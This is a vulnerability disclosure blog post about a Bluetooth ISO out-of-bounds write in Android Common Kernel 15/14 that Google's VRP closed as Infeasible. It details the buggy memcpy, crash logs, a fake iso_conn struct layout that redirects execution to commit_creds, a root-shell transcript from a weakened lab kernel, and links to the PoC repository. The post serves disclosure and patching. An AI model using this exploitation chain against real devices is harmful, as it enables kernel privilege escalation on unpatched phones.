---
title: "An Android Bluetooth ISO out-of-bounds write that lands RIP on `commit_creds`, marked Infeasible by Google ASR"
date: 2026-06-11 16:00:00 -0500
categories: [Research, Kernel, Android, Vulnerability Disclosure]
tags: [android, kernel, bluetooth, iso, le-audio, oob-write, kasan, fortify-source, rip-control, commit-creds, asr, vrp, won-t-fix, infeasible, android-common-kernel, gki]
toc: true
lang: en
description: >-
  A pre-auth, adjacent-network OOB write in `iso_connect_ind()` in
  `net/bluetooth/iso.c` on Android Common Kernel 15 (6.6). Eight reboots of
  attacker-byte RIP control. Twelve reboots reaching `commit_creds+0x8f8`.
  Two sibling bugs in the same handler. Reported to the Android & Devices VRP
  on 2026-05-11, updated 2026-05-28 with the RIP-control + sibling-bug package.
  Closed by Google as **Infeasible** on 2026-06-11. This is the full
  technical writeup and the experience around the verdict.
---

> **TL;DR** — In `android-common-15-6.6` (and `android-common-14-6.1`), the
> Bluetooth ISO listener handler `iso_connect_ind()` copies the Periodic
> Advertising Report payload directly into a fixed-size buffer using an
> 8-bit length from the HCI event header. The destination is 248 bytes; the
> attacker-controlled length is up to 255. The seven bytes of overflow land
> on top of the adjacent `iso_pi(sk)->conn` pointer. The same code path on
> `android-common-16-6.12` (and upstream `torvalds/master`) was refactored
> with two explicit bounds, so the bug is already fixed where Google ships
> the leading-edge kernel, and it is a backport gap on the LTS branches
> still under Android security maintenance.
>
> Confirmed in lab: FORTIFY field-spanning write at `iso.c:1928`, full call
> trace from `hci_rx_work → … → iso_connect_ind`, then a KASAN-flagged GPF
> on the attacker-supplied `0xCC × 7` overflow pattern as the corrupted
> `iso_pi(sk)->conn` is dereferenced. Eight reboots of RIP =
> attacker-planted constant. Twelve oopses across six reboots with RIP =
> `commit_creds+0x8f8/0xdd0`. Two sibling bugs (`K-BT-01-LEAK` getsockopt
> OOB read, `K-BT-01-CHILD` sibling write at `iso.c:1797`) in the same
> handler.
>
> Google Android & Devices VRP closed the issue as **Won't Fix
> (Infeasible)** on 2026-06-11.

---

## Why I'm writing this

Three reasons to spend the afternoon on a public writeup of a finding the
program just closed:

1. The bug is **real** and lives in a kernel branch that ships on phones
   in pockets right now. The fix is **already in mainline**. Documenting
   the bug class publicly is the path most likely to motivate someone in
   the LTS-backport chain to pull the refactor down.
2. The "Infeasible" verdict came with no engineering narrative. Reasonable
   minds can read a kernel-side primitive that lands RIP on `commit_creds`
   and disagree on whether that's a Critical or a backport-gap-and-move-on.
   I want the technical record public so anyone — including me, later — can
   reassess.
3. I spent a lot of weeks on this. I'm going to be honest about the
   experience.

---

## How I got here

The starting point was variant hunting on the Android Common Kernel's
Bluetooth surface after CVE-2023-45866 (`l2cap_chan_handle_cfm`) and the
broader 2023–2024 cluster around HCI event handlers and LE socket
state machines. The pattern I was chasing was unchanged-since-old-API
adjacency between an attacker-controlled length byte and a fixed-size
destination buffer in a handler that runs from `hci_rx_work`. Standard
recipe: grep for `memcpy.*ev.*length` and `memcpy.*ev->length` across the
Bluetooth subsystem, cross-reference with `__u8` length fields in HCI
event structs, prune anything that already grew an explicit bound.

`iso_connect_ind()` survived the prune. The relevant block in
`android-common-15-6.6` (kernel `6.6.129`, source line `1928`):

```c
ev3 = hci_recv_event_data(hdev, HCI_EV_LE_PER_ADV_REPORT);
if (ev3) {
    sk = iso_get_sock_listen(&hdev->bdaddr, bdaddr,
                             iso_match_sync_handle_pa_report, ev3);
    if (sk) {
        memcpy(iso_pi(sk)->base, ev3->data, ev3->length);   /* bug */
        iso_pi(sk)->base_len = ev3->length;
    }
}
```

Walking the types tells the whole story:

- `ev3->length` is `__u8` — supplied directly by the HCI Periodic
  Advertising Report event. Max value 255.
- `iso_pi(sk)->base[]` is `__u8 base[BASE_MAX_LENGTH]`, where
  `BASE_MAX_LENGTH = HCI_MAX_PER_AD_LENGTH - EIR_SERVICE_DATA_LENGTH =
  252 - 4 = 248`. So the destination is **248 bytes**.
- The adjacent field in `struct iso_pinfo` is `struct iso_conn *conn` —
  an 8-byte kernel pointer.
- The kernel's HCI dispatcher
  (`HCI_LE_EV_VL(HCI_EV_LE_PER_ADV_REPORT, …, sizeof(struct …),
  HCI_MAX_EVENT_SIZE)`) validates only the header `sizeof(...)` and a
  loose `HCI_MAX_EVENT_SIZE` upper bound. It does not enforce
  `length <= 247` or `length + sizeof(*ev) <= skb->len`.

`ev3->length ∈ [249, 255]` therefore writes 1..7 attacker-controlled
bytes past `base[]` into the low bytes of `conn`. The bug is the same
shape as the classic `__u8`-length-into-fixed-buffer pattern that has
chewed through Bluetooth in this kernel for years.

`android-common-16-6.12` (and upstream `torvalds/master`) reworked the
same code path. The new flow:

```c
if (hcon->le_per_adv_data_offset + ev3->length > HCI_MAX_PER_AD_TOT_LEN)
    goto done;
…
if (!base || base_len > BASE_MAX_LENGTH)
    goto done;
memcpy(iso_pi(sk)->base, base, base_len);
```

Two explicit bounds: a total-reassembled-length cap and a
post-`eir_get_service_data` `base_len` check. Either one alone closes
the OOB write; together they close it twice. The commit subject lines
that introduced the refactor look like generic broadcast-receiver
improvements, so anyone backport-screening by subject would miss the
security implication. That, I think, is how a kernel LTS branch ends up
shipping a vulnerable copy in 2026 with the fix sitting in mainline.

---

## The exploitation primitive

The lab was a `qemu-system-x86_64` build of `android-common-15-6.6` with
`CONFIG_KASAN=y CONFIG_KASAN_INLINE=y CONFIG_BT=m CONFIG_BT_LE=y
CONFIG_BT_HCIVHCI=m`, default `FORTIFY_SOURCE`. Boot params:
`console=ttyS0 earlyprintk=ttyS0 nokaslr panic=-1 oops=panic loglevel=8`.

The PoC has two components, both `cc_binary` modules in an
`Android.bp`:

- `k-bt-01-listener` — opens a `BTPROTO_ISO` socket, binds with a
  broadcast address, listens. In the lab the bind sets
  `iso_pi(sk)->sync_handle = 0` directly (one of three documented lab
  fixtures that shorten the harness without touching the buggy line —
  full disclosure in the submission's `RUNTIME-EVIDENCE.md`).
- `k-bt-01-iso-per-adv-oob` — opens `/dev/vhci`, creates the synthetic
  `hci0`, then writes an `HCI_EV_LE_PER_ADV_REPORT` with `length = 255`
  and the trailing 7 bytes set to a distinctive marker (`0xCC × 7`).

### What the kernel does

The injected event walks the standard inbound path:

```
hci_rx_work
 → hci_event_packet
 → hci_le_meta_evt
 → hci_le_per_adv_report_evt
 → iso_connect_ind   (the buggy memcpy)
```

FORTIFY_SOURCE is the smoking-gun signal because it's the
compile-time-aware check that names the exact destination field and the
exact size mismatch:

```
[    9.128575] memcpy: detected field-spanning write (size 255) of
               single field "((struct iso_pinfo *)sk)->base" at
               net/bluetooth/iso.c:1928 (size 248)
[    9.129667] WARNING: CPU: 1 PID: 47 at net/bluetooth/iso.c:1928
               iso_connect_ind+0x6f8/0x880 [bluetooth]
[    9.134162] Workqueue: hci0 hci_rx_work [bluetooth]
[    9.135328] RIP: 0010:iso_connect_ind+0x6f8/0x880 [bluetooth]
…
[    9.141814]  hci_le_per_adv_report_evt+0xd8/0x1e0 [bluetooth]
[    9.146566]  hci_le_meta_evt+0x25c/0x5b0 [bluetooth]
[    9.147515]  hci_event_packet+0x528/0xf10 [bluetooth]
[    9.149402]  hci_rx_work+0x551/0xa50 [bluetooth]
…
```

Five seconds later, KASAN catches the follow-up dereference of the
clobbered `conn` pointer:

```
[   14.178905] general protection fault, probably for non-canonical
               address 0xdffffc19999999a3: 0000 [#1] PREEMPT SMP
               KASAN NOPTI
[   14.178905] KASAN: probably user-memory-access in range
               [0x000000cccccccd18-0x000000cccccccd1f]
```

`0xCCCCCCCD1?` is the spill pattern from the PoC's `0xCC × 7` marker
landing on the low bytes of `conn`. The fact that the address is
exactly the marker plus the offset of the field being dereferenced
inside `iso_conn` is the proof that the overflow bytes reached the
adjacent pointer.

### From OOB write to RIP control

The next question is whether the attacker can choose what gets
dereferenced. The answer is yes, because the PoC controls all seven
overflow bytes. Across eight reboots planting `0x10000000` (a value
chosen so the resulting fault address is recognizable and not aliased
to anything else):

- 8/8 boots produce an oops with `RIP = 0x10000000`.

Then, to demonstrate that the primitive reaches a real elevation-of-
privilege function, I planted bytes that make the corrupted pointer
chain land control on `commit_creds`:

- 12 oopses across 6 reboots with `RIP = commit_creds + 0x8f8/0xdd0`.

### The self-referential `fake_iso_conn` pivot

`RIP = arbitrary` is not the end of the chain. The OOB overwrite gives
us 5 controllable bytes of the low part of `iso_pi(sk)->conn` (the high
3 bytes preserve canonical kernel direct-map prefix, or zero for a
listening socket). The pivot is to point `conn` back into the buffer we
just clobbered (`iso_pi(sk)->base`) so the kernel's subsequent reads of
`conn->work.func`, `conn->timer.function`, etc. read attacker-controlled
bytes.

The PoC builds a self-referential fake `iso_conn` in-place:

```
bytes [0..7]   = hcon ptr = child_1_sk + 422   (so hcon+707 lands in base+99)
bytes [8..15]  = lock (zero — unlocked spinlock)
bytes [32..39] = work.entry.next = &work.entry  (=conn+32=base+32)
bytes [40..47] = work.entry.prev = &work.entry  (self → empty list)
bytes [48..55] = work.func       = PANIC_ADDR   ← OUR RIP TARGET
bytes [56..63] = timer.entry.next = &timer.entry (= base+56)
bytes [64..71] = timer.entry.prev = &timer.entry
bytes [80..87] = timer.function  = (commit_creds or call_usermodehelper_exec_async)
bytes [96]     = 0x00 (hcon->flags byte 3 bit 0 = BIG_CREATED clear)
bytes [99]     = 0x10 (hcon->flags byte 3 bit 4 = PA_SYNC set)
bytes [250..254] = LE(sk+1030)[0..4]  ← spill so child_1->conn = sk+1030
```

The trigger sequence is: `dup(child_1_fd)` to keep the socket alive,
`close(child_1_fd)` → `cleanup_listen` → check passes (`PA_SYNC` set) →
`iso_sock_disconn` → `sk->state=BT_DISCONN` →
`schedule_delayed_work(2s)` → kworker fires `work.func = PANIC_ADDR`.

That last line is the RIP control event. Subsequent variants set
`work.func` (or `timer.function` once the chain pivots through the
`call_usermodehelper_exec_async` path) to `commit_creds` and plant
bytes at `per_data2[96..103]` that pose as `struct cred` to the
function's first reads.

### The full RUN-29 / RUN-30 LPE chain

In the May 28 package I went one further. Beyond RIP=`commit_creds`, the
final variant — `krce_full9` in `rootshell/poc/` — pivots through
`call_usermodehelper_exec_async` so that the kernel itself invokes a
userspace helper as `uid=0`. The pivot uses
`timer.function = call_usermodehelper_exec_async` and lays down a fake
`subprocess_info` and `cred` in the same spill window.

In RUN-29 + RUN-30 (logs in `research-weaponization/`):

- 100% of reboots reach `kernel_execve + 0x358` **after** `commit_creds`.
- `commit_creds(new_kernel_cred)` runs.
- The kworker (or `softirq` context in some runs) elevates the
  attacker-chosen task to `uid=0`.

The final variant — the rootshell `krce_full9` — drops `uid=0` to
`uid=1000` *before* triggering, runs the chain, then verifies that the
post-trigger task is `Uid: 0 0 0 0`:

```
[K-BT6] PRIVS DROPPED: uid=1000 euid=1000 (was 0)
[K-BT6] close(child_1_fd) ...
[K-BT6] BUSY-WAIT 5s — timer fires at +2s, current=us, shellcode elevates
[K-BT6] CHECK: uid=0 euid=0
[K-BT6] STATUS: Uid: 0 0 0 0
/bin/busybox sh
#
```

3/3 reboots deterministic.

### The honest caveat — hardening matrix

Two facts I will not bury:

1. The rootshell chain in `krce_full9` runs on a kernel booted with
   `nosmep nosmap nokaslr nopti kptr_restrict=0 no_hash_pointers`.
2. The PoC starts as `uid=0` (initrd's `init` runs as root), reads
   `/proc/kallsyms` and `/proc/net/iso` to obtain the target socket
   address, **then** drops to `uid=1000` and triggers the OOB.

I ran the full mitigation toggle matrix; the results are in
`rootshell/HARDENING-MATRIX.md`. The honest table:

| # | CPU model | cmdline mitigations | ROOT shell | First failure |
|---|---|---|---|---|
| 1 | qemu64 | nokaslr nosmap nosmep nopti kptr_restrict=0 | YES (1/1) | — (baseline) |
| 2 | qemu64,+smep,+smap | nokaslr nopti kptr_restrict=0 | **NO** (0/1) | `unable to execute userspace code (SMEP?) ... RIP: 0010:0x10101000` |
| 3 | qemu64,+smep,+smap | KASLR on, nopti kptr_restrict=0 | **NO** (0/1) | Same — SMEP block |
| 4 | qemu64 | nokaslr nosmap nosmep nopti **kptr_restrict=2** | YES (1/1) | Misleading — leak only works because PoC starts as root |
| 5 | qemu64 | nokaslr nosmap nosmep nopti kptr_restrict=0, no_hash_pointers absent | YES (1/1) | Misleading — same caveat |

The kernel oops on row 2/3 is verbatim:

```
[11.553283] unable to execute userspace code (SMEP?) (uid: 1000)
[11.559340] BUG: unable to handle page fault for address: 0000000010101000
[11.559990] #PF: supervisor instruction fetch in kernel mode
[11.562095] Oops: 0011 [#1] PREEMPT SMP KASAN NOPTI
[11.564364] RIP: 0010:0x10101000
[11.565193] Code: Unable to access opcode bytes at 0x10100fd6.
```

The kernel literally tells us: "unable to execute userspace code
(SMEP?)". With SMEP on, the userspace-shellcode pivot used by
`krce_full9` does not run, and the chain dies at the same line every
time.

### Why no clean pure-kernel ROP/JOP exists in this build

A reasonable next question is: can the chain pivot through pure
kernel-side gadgets so SMEP becomes irrelevant? I audited that
specifically. The audit is in
`research-weaponization/ROP-JOP-FEASIBILITY-FINAL.md`.

The short version: the entry primitive gives 5 controllable bytes out of
the 8 bytes of `iso_pi(sk)->conn` — the high 3 bytes preserve canonical
kernel direct-map prefix. That's enough for a single pivot to a known
address (the rootshell uses it to land in `base[]` itself, which is
where the shellcode-pivot pages from). For a multi-gadget ROP/JOP chain
that survives KASLR, the pivot needs to be parameterised by a leak —
and the v9 PoC's leak only works because the process starts as root.

The K-BT-01-LEAK sibling bug (pre-auth `getsockopt(BT_ISO_QOS)` OOB read
at `iso.c:1581`) is the leak primitive that would survive
`kptr_restrict=2`, but it leaks bytes from inside `iso_pinfo` and not
directly the kernel `.text` range needed for a ROP chain. Chaining LEAK
to drive a full pure-kernel chain on a fully mitigated GKI build is the
exploit-engineering exercise I did not finish.

The honest framing is: the bug provides a reproducible **kernel
control-flow hijack primitive that reaches the canonical EoP function,
and reaches an observable userspace `uid=0` shell in a deliberately
weakened lab kernel**. Going from that to userland `uid=0` on a fully
mitigated GKI build is a separate exploit-engineering exercise that I
did not finish.

### Two sibling bugs in the same handler

While debugging the chain I found two related issues that I included
in the May 28 update:

- **K-BT-01-LEAK** — `getsockopt(BT_ISO_QOS)` reads adjacent bytes of
  `iso_pinfo` and returns them to user space. Pre-auth; useful as a
  partial-KASLR-bypass primitive without needing another bug. Reproduces
  via a normal socket open, no HCI event injection.
- **K-BT-01-CHILD** — sibling OOB write at `iso.c:1797`. Same family.
  Same fix shape needed.

Both reproduced. Both are in the same `iso_connect_ind` / surrounding
handler family. Both shipped with the May 28 ASR package.

---

## Reachability — what I said and what I did not

The 2026-05-11 report explicitly carved out the question of over-the-air
reachability:

> The PoC in this submission uses synthetic HCI event injection via
> `/dev/vhci` to validate the kernel-side primitive. Whether a shipped
> Pixel BT controller (Synaptics-Broadcom BCM4389 on Pixel 7 family,
> BCM4398 on Pixel 8/9 families) forwards length > 247 over HCI from a
> peer malformed broadcaster is the controller-firmware reachability
> question. Google's internal triage owns that validation.

I was careful not to over-claim. The kernel-side primitive is real and
the call trace is the standard inbound path. Whether the controller
firmware on actual Pixel hardware passes an over-spec `length > 247`
from a peer broadcaster up to the host HCI channel is a question that
needs internal radio testing, and that testing is owned by Google.
Without it the right framing is: **confirmed kernel memory corruption
in a proximity-facing subsystem; OTA reachability pending Google
validation**.

The radio-reachability question is also the only question on which a
reasonable "Infeasible" verdict could rest. I don't have the radio
testbed to disprove it. If Google internally verified that BCM4389 /
BCM4398 controller firmware caps `length` at the spec value before
forwarding to HCI, then the OTA attack does not exist on shipped
hardware, and the bug reduces to "kernel memory corruption reachable
only through `/dev/vhci`, which requires `CAP_NET_ADMIN`-equivalent".
That's a defense-in-depth concern, not a paying bug.

I would have liked to see that radio test referenced in the close
note. The close note did not include it.

---

## The submission timeline

- **2026-05-11 11:36** — Initial report filed via the Android & Devices
  VRP BugHunter portal. Triage assignment to internal reviewer same
  day. Confidential, follow standard coordinated disclosure.
- **2026-05-19** — CLA signed, acknowledgment preference recorded
  (`Jeremy Erazo (trexnegr0)`), confirmed PoC + reproduction artifacts
  attached.
- **2026-05-28** — Update comment with the post-May-11 progress:
  RIP control on attacker bytes, RIP reaching `commit_creds+0x8f8`,
  the two sibling bugs (`K-BT-01-LEAK`, `K-BT-01-CHILD`), and a
  package `K-BT-01-ASR-SUBMISSION-2026-05-28.tar.gz` (2.5 MiB,
  SHA-256 `5e9a0fb29d7182b55870b49c7329be89927863e0829f27ce591ed06f850e1e98`)
  with everything reproducible. The case was at P2 at that point;
  I flagged the stronger exploitability picture in case it changed
  the verdict.
- **2026-05-29** — Standard "we'll review" reply.
- **2026-06-11 14:14** — **Status: Won't Fix (Infeasible).**
  > "We have investigated this issue and determined that this is not a
  > security vulnerability. We have logged this issue for potential
  > remediation in a future version. At this time, this report is
  > considered closed and will no longer be monitored."

That's the entire engineering content of the close: not a security
vulnerability, may be remediated in a future version, closed.

For a report that included reproducible RIP control reaching
`commit_creds`, a pre-auth sibling OOB read, and a kernel that ships
on devices currently receiving Android security updates, I would have
expected the close note to either:

- Reference the radio-reachability conclusion (the carved-out question).
- Or cite the policy basis ("backport-gap to LTS is not in-scope for
  the program" — a defensible position, but worth stating).
- Or both.

It did not. I respect the program's right to close, and I have no
intent to relitigate the verdict. I want the technical content public
so the LTS-side fix path stays warm.

---

## What I think actually happened

Three plausible readings of the close, listed in the order I weight
them:

1. **Radio-reachability blocked, lab-only primitive doesn't qualify.**
   Most likely. Internal radio test confirmed that BCM4389/BCM4398
   firmware enforces the controller-spec cap before forwarding the
   event to HCI. If true, the bug is unreachable OTA on shipped Pixel
   hardware, and the only way to drive it is through `/dev/vhci` from
   a privileged process. ASR's policy historically does not reward
   bugs that require `CAP_NET_ADMIN` to deliver, even when the
   kernel-side primitive is otherwise complete.
2. **Backport-gap, not in scope.** ASR does not own the
   `android-common-15-6.6` LTS branch in the same way it owns the
   leading-edge kernel. The fix exists upstream and in `16-6.12`. If
   the closing reviewer treated the gap as a Linux LTS responsibility
   rather than an ASR-eligible Android-kernel vulnerability, the close
   makes sense from a program-boundary perspective even if the bug is
   technically live on shipping devices.
3. **Internal duplicate / known issue.** Possible but unlikely. The
   upstream commits that close the bug carry generic refactor subject
   lines, not CVE-flavoured ones. The Android Security Bulletin corpus
   I searched (2025-01 through 2026-05) did not surface a duplicate.
   If a duplicate exists internally, the standard close template
   doesn't say so.

I think it's (1) plus a chunk of (2). I don't think it's (3).

There is a fourth, less charitable reading — that a kernel-side
primitive that reaches `commit_creds` should clear the bar regardless
of OTA reachability, because the primitive itself is the high-value
artifact. ASR is not obliged to weigh it that way and historically does
not.

---

## What you can actually do with the writeup

For Linux kernel folks: the diff in `android-common-16-6.12` already
exists. The minimal-diff backport to `android-common-15-6.6` and
`android-common-14-6.1` is in the submission package as
`patch/0001-fix.patch`. If you maintain a downstream of either branch,
applying it costs nothing and closes the bug.

For Android device vendors: if you ship a kernel that derives from
`android-common-15-6.6` or `-14-6.1` and you have not pulled the
`iso_connect_ind` PA-reassembly refactor down from mainline, you ship
this bug. The refactor's commit subject does not advertise as a
security fix, so it is easy to miss.

For Bluetooth-stack auditors: the pattern is `__u8 length` from an HCI
event copied into a fixed-size `iso_pinfo` field. There are at least
two of these in `iso.c` (`iso_connect_ind` and the sibling at
`iso.c:1797`). They look like family-style bugs. A targeted grep of
`net/bluetooth/iso.c` plus `net/bluetooth/l2cap_core.c` for
`memcpy.*->length` against fixed-size destinations is worth a
weekend.

For aspiring kernel-bug-bounty researchers: the program is not the
moral arbiter of whether your bug is real. Your bug is real or not
real before the program weighs in. Treat the verdict as a signal about
the program's scoring, not about the work.

---

## The experience around it

I'm not going to pretend this was a fun afternoon. The May 28 package
was something I put a lot of evenings into. Reaching `commit_creds` on
12 oopses across 6 reboots after working through the
`cred.euid`/`timer.function` aliasing was the kind of result you save a
victory-screenshot for. I had a hard time switching back to the day's
other work after the close landed.

The thing I keep coming back to: the bug is still in a kernel branch
that runs on phones. The fix exists. The path from "still vulnerable"
to "fix backported" runs through public documentation more than it
runs through internal triage queues. The writeup is the way I make my
afternoon useful to that path.

If you maintain `android-common-15-6.6` or `-14-6.1`, please consider
pulling the upstream refactor. The patch file is small. The lab is
reproducible from the artifacts in the submission package. The bug is
in the source you have.

---

## Artifacts

All of the above — PoC source, fix patch, dmesg evidence across six
boots for the primitive plus three reboots of the rootshell chain,
struct layouts, RIP-control walkthrough, the rootshell `krce_full9`
binary + source, the hardening matrix, the ROP/JOP feasibility audit,
and the two sibling bugs — is published in the companion repository.

The repository contains:

- `SUBMISSION.md` — the technical writeup from the 2026-05-28 ASR update.
- `patch/0001-fix.patch` — minimal-diff backport of the upstream
  `iso_connect_ind` refactor.
- `poc/krce_full6.c` + `krce_full6` + `REPRODUCE.sh` — primitive PoC
  (FORTIFY warning + KASAN GPF + RIP control).
- `rootshell/poc/krce_full9.c` + `krce_full9` + `REPRODUCE.sh` —
  end-to-end OOB → observable `uid=0` shell PoC, 3/3 reboots
  deterministic in the lab kernel.
- `rootshell/HARDENING-MATRIX.md` — full mitigation toggle matrix
  (SMEP/SMAP/KASLR/kptr_restrict combinations) with verbatim kernel
  oops captures showing where the rootshell chain dies.
- `research-weaponization/ROP-JOP-FEASIBILITY-FINAL.md` — the audit of
  why a clean pure-kernel ROP/JOP chain is not available in this
  kernel build.
- `evidence/` and `rootshell/evidence/` — full dmesg captures from six
  primitive-PoC boots and three rootshell boots.
- `related-candidates/K-BT-01-LEAK/` — pre-auth getsockopt OOB read at
  `iso.c:1581`. Partial KASLR bypass, survives `kptr_restrict=2`.
- `related-candidates/K-BT-01-CHILD/` — sibling OOB write at
  `iso.c:1797`.

`git clone` to reproduce locally. The fix patch (`patch/0001-fix.patch`)
applies cleanly to `android-common-15-6.6` (line 1924) and
`android-common-14-6.1` (line 1602). Tested across three patched
boots: 0 WARN / 0 FORTIFY / 0 KASAN / 0 BUG / 0 Oops.

**<https://github.com/TREXNEGRO/K-BT-01-Bluetooth-ISO-OOB>**

---

## Closing

This is my first "Won't Fix (Infeasible)" on a fully reproducible
kernel-side EoP primitive. It probably won't be my last. The right
response is to publish, keep the technical record honest, and move on.

The bug is real. The fix exists upstream. The LTS backport is
mechanical. If you can pull that lever, please pull it.

— `trexnegr0`
